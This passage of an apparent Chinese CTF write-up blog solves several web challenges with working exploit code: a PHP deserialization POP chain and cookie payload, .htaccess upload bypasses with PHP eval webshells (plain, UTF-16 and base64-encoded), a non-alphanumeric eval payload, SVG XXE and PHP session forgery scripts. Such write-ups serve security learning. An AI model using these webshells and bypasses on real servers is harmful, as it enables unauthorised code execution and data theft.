<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:3;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:5:&quot;email&quot;;s:15:&quot;admin@admin.com&quot;;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;s:3:&quot;img&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p>扫目录得到 <code>www.tar.gz</code> 压缩包，代码审计</p>
<p>用PHPStorm打开会发现有两个断点，应该是给的hint</p>
<p><code>Register.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724164356.png" alt=""></p>
<p><code>Index.php</code>中有一个把cookie反序列化的地方。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724164417.png" alt=""></p>
<p>这么来看应该是构造反序列化的POP链。</p>
<p>在<code>Profile.php</code>发现关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里肯定是利用<code>__call</code>函数去执行我们的命令了。</p>
<p>构造POP链先找<code>__destruct</code>方法，很明显刚刚<code>Register.php</code>中就有析构函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里我们用<code>Register-&gt;checker = Profile</code>，利用<code>Profile-&gt;index()</code>去触发<code>Profile</code>类中的<code>__call</code>魔术方法。</p>
<p>但是我们可以看到<code>Profile.php</code>当中的<code>__call</code>方法调用的参数是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过文档我们可以知道<code>$name</code>是不存在方法的调用的名字，在这里也就是<code>index</code>，<code>$arguments</code>就是传入调用方法的参数，这里就为空。</p>
<p>而当使用<code>$this-&gt;index</code>的时候，我们会触发另一个魔术方法<code>__get</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里又调用了<code>$this-&gt;except[$name]</code>，而<code>$name</code>我们可以通过<code>__call</code>调用的值确定为<code>index</code>，而且<code>Profile</code>类存在一个公有类<code>except</code>可以供我们修改。</p>
<p>接着利用<code>_get</code>的返回会使<code>__call</code>方法中的<code>if</code>为真，执行<code>$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</code>。</p>
<p>有了POP链之后，我们应该去调用什么函数呢，接着看<code>Profile.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>第一个if可以直接pass，第二个if语句如果我们不上传文件也可以直接通过，第三个if直接赋值绕过，然后可以构造图片马绕过<code>getimagesize</code>的判断，控制<code>$this-&gt;filename</code>为php后缀形式，这样利用<code>copy($this-&gt;filename_tmp, $this-&gt;filename)</code>就可以复制出了一个 php webshell 了。</p>
<p>构造payload的exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$checker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $checker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp = <span class="string">&#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/00bf23e130fa1e525e332ff03dae345d.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">&#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/shell.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $ext = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register(<span class="keyword">new</span> Profile());</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure>
<p>得到payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo0OntzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2FkZWVlMGMxNzBhZDRmZmIxMTBkZjBjZGUyOTRhZWNkLzAwYmYyM2UxMzBmYTFlNTI1ZTMzMmZmMDNkYWUzNDVkLnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvYWRlZWUwYzE3MGFkNGZmYjExMGRmMGNkZTI5NGFlY2Qvc2hlbGwucGhwIjtzOjM6ImV4dCI7YjoxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7YjowO30&#x3D;</span><br></pre></td></tr></table></figure>
<p>填到cookie中，刷新页面</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724175540.png" alt=""></p>
<p>蚁剑连接拿flag。</p>
<h2 id="SUCTF2019-EasyWeb">SUCTF2019 EasyWeb</h2>
<h3 id="考点-v6">考点</h3>
<ul>
<li>无字母数字webshell</li>
<li>文件上传</li>
<li>.htaccess利用</li>
</ul>
<h3 id="解题-v6">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>和极客大挑战2019 RCE ME类似的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?_&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
<p>可以成功显示PHPINFO的信息，注意四个点，一是PHP版本是7.2，二是题目的环境是Apache，三是限制了open_basedir，最后是disable_function。</p>
<p>再来看get_the_flag函数，按照题意应该是想让我们通过调用get_the_flag函数来get shell，函数中有三个限制：</p>
<ul>
<li>文件内容中不能出现<code>&lt;?</code></li>
<li>使用了exif_imagetype来判断是不是图片</li>
<li>后缀名中不允许出现ph</li>
</ul>
<p>这里的限制条件就有点像SUCTF2019 CheckIn，不同的是那道题的环境是nginx，可以通过上传<code>.user.ini</code>来绕过。那么这道题如果要通过上传<code>.htaccess</code>来绕过后缀名的限制，就需要绕过<code>exif_imagetype</code>，并且不能用GIF89a等文件头，因为这样虽然能上传成功，但<code>.htaccess</code>文件无法生效。这时有两个办法：</p>
<ul>
<li>
<p>在.htaccess前添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br></pre></td></tr></table></figure>
<p><code>#</code>在<code>.htaccess</code>是注释符，所以<code>.htaccess</code>文件可以生效</p>
</li>
<li>
<p>在.<code>htaccess</code>前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)<br>
x00x00x8ax39x8ax39 是wbmp文件的文件头，<code>.htaccess</code>中以0x00开头的同样也是注释符，所以不会影响<code>.htaccess</code></p>
</li>
</ul>
<p>最后就需要绕过<code>&lt;?</code>，同样也有两个办法，不过只是编码的不同而已，一种是base64编码，一种是uft-16编码，都来了解一下。</p>
<p>先来看utf-16的编码方式，这是<code>.htaccess</code>文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define width 1337                          # Define the width</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .cc         # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure>
<p>可以绕过的原因借用一下<a href="https://www.cnblogs.com/tr1ple/p/11207145.html#jCmcxrz8">tr1ple师傅的图</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707153040.png" alt=""></p>
<p>也就是说原来是utf-8一个字符一个字节，现在utf-16是两个字节编码一个字符，那么明显可以绕过内容的过滤，exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Description : create and bypass file upload filter with .htaccess</span></span><br><span class="line"><span class="comment"># Author : Thibaud Robin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span></span><br><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = open(filename, <span class="string">&#x27;wb&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = open(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .cc\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line">        </span><br><span class="line">generate_htacess()</span><br><span class="line">generate_php_file(<span class="string">&quot;shell.cc&quot;</span>, <span class="string">&quot;&lt;?php eval($_POST[&#x27;shell&#x27;]); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>上传两个文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8bf8acd4-49c6-40c6-9bfe-688945f733ac.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span></span><br><span class="line">payload = &#123;&#125;</span><br><span class="line">headers = &#123;&#125;</span><br><span class="line">htaccess_files = [</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>, open(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">]</span><br><span class="line">shell_files = [</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>, open(<span class="string">&#x27;shell.cc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, files=htaccess_files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, files=shell_files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
<p>验证一下</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707163111.png" alt=""></p>
<p>用蚁剑连接，加载绕过<a href="https://github.com/Medicean/as_bypass_php_disable_functions">disable_function的插件</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707163432.png" alt=""></p>
<p>第二种是用base64编码绕过</p>
<p>htaccess文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType application&#x2F;x-httpd-php .cc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.cc&quot;</span><br></pre></td></tr></table></figure>
<p>shell的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a12 &#x2F;&#x2F; 12为了满足base64算法凑足八个字节</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pPz4&#x3D;  &#x2F;&#x2F;&lt;?php @eval($_POST[cmd])?&gt;的base64编码</span><br></pre></td></tr></table></figure>
<h3 id="拓展">拓展</h3>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">.htaccess trick总结</a></p>
<p><a href="https://dy.163.com/article/ECQSCP9E0511CJ6O.html">PHP7绕过open_basedir</a></p>
<h2 id="BSidesCF2019-SVGMagic">BSidesCF2019 SVGMagic</h2>
<h3 id="考点-v7">考点</h3>
<ul>
<li>
<p>SVG文件格式</p>
</li>
<li>
<p>XXE读取文件</p>
</li>
</ul>
<h3 id="解题-v7">解题</h3>
<p>先来看看什么是SVG。</p>
<p>SVG 意为可缩放矢量图形（Scalable Vector Graphics）， <strong>使用 XML 格式定义图像</strong>。</p>
<p>看一个实例</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818205345.png" alt=""></p>
<p>用常规的XXE文件读取payload</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818205431.png" alt=""></p>
<p>这个地方有个坑就是flag的文件位置在当前目录，<strong>而<code>proc/self/cwd</code>就代表当前路径。</strong></p>
<h2 id="HFCTF2020-BabyUpload">HFCTF2020 BabyUpload</h2>
<h3 id="考点-v8">考点</h3>
<ul>
<li>
<p>代码审计</p>
</li>
<li>
<p>session伪造</p>
</li>
</ul>
<h3 id="解题-v8">解题</h3>
<p>审计源码可以发现这几个点</p>
<ul>
<li>session中存储了身份信息，默认事guest</li>
<li>通过参数可以上传文件和下载文件</li>
</ul>
<p>既然这样，那我们就先把session文件下载下来看看是什么样子的。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819190549.png" alt=""></p>
<p>应该是用php_binary方式序列化的session。</p>
<p>那么现在的思路就是：</p>
<p>伪造admin session --&gt; 上传新的sess文件 --&gt; 将cookie改成sess文件sha256加密后的字符串</p>
<p>但是现在还有一个问题就是如果绕过对success.txt的判断。</p>
<p>由于文件名不可控，我们就无法上传一个名为success.txt的文件，但是file_exists函数的作用的是<strong>检查文件或目录是否存在</strong>，所以我们用attr创建一个名为success.txt的目录就可以过这个判断。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://0abaf9de-86a1-4b6e-ab78-f008f607f2d5.node3.buuoj.cn&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;up_file&quot;</span>: (<span class="string">&quot;sess&quot;</span>, BytesIO(<span class="string">b&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;download&quot;</span>,</span><br><span class="line">        <span class="string">&quot;attr&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, data=data, files=files)</span><br><span class="line">    session_id = hashlib.sha256(<span class="string">&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;</span>.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> session_id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_success</span>():</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;upload&quot;</span>,</span><br><span class="line">        <span class="string">&quot;attr&quot;</span>: <span class="string">&quot;success.txt&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;up_file&quot;</span>: (<span class="string">&quot;test&quot;</span>, BytesIO(<span class="string">b&#x27;good job!&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url, data=data, files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">upload_success()</span><br><span class="line">php_session_id = admin()</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: php_session_id</span><br><span class="line">&#125;</span><br><span class="line">s = requests.get(url)</span><br><span class="line">r = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<h2 id="HarekazeCTF2019-Avatar-Uploader-1">HarekazeCTF2019 Avatar Uploader 1</h2>
<h3 id="考点-v9">考点</h3>
<ul>
<li>finfo_file函数和getimagesize函数的区别</li>
</ul>
<h3 id="解题-v9">解题</h3>
<p>原题是给了源码。</p>
<p>关键代码是在upload.php中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// check file type</span></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line"><span class="keyword">if</span> (!in_array($type, [<span class="string">&#x27;image/png&#x27;</span>])) &#123;</span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;Uploaded file is not PNG format.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file width/height</span></span><br><span class="line">$size = getimagesize($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">0</span>] &gt; <span class="number">256</span> || $size[<span class="number">1</span>] &gt; <span class="number">256</span>) &#123;</span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;Uploaded image is too large.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">2</span>] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  <span class="comment">// I hope this never happens...</span></span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span class="string">&#x27;FLAG1&#x27;</span>) . <span class="string">&#x27;&lt;/code&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们得了解PHP文件头格式是什么样的</p>
<p><a href="https://blog.csdn.net/u013943420/article/details/76855416">https://blog.csdn.net/u013943420/article/details/76855416</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200829113331.png" alt=""></p>
<p><code>89 50 4E 47 0D 0A 1A 0A</code> 是PNG头部署名域，表示这是一个PNG图片<br>
<code>00 00 00 0D</code> 描述IHDR头部的大小<br>
<code>49 48 44 52</code> 是Chunk Type Code, 这里Chunk Type Code=IHDR</p>
<p>接下来需要了解finfo_file函数和getimagesize函数的区别就在于：<code>FILEINFO</code> 可以识别 png 图片( 十六进制下 )的第一行，而 <code>getimagesize</code> 不可以。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200829113733.png" alt=""></p>
<h2 id="SUCTF-2019-getshell">SUCTF 2019 getshell</h2>
<h3 id="考点-v10">考点</h3>
<ul>
<li>无数字字母webshell</li>
</ul>
<h3 id="解题-v10">解题</h3>
<p>可用字符：<code>$().;=[]_~</code></p>
<p>取反绕过，webshell：</p>
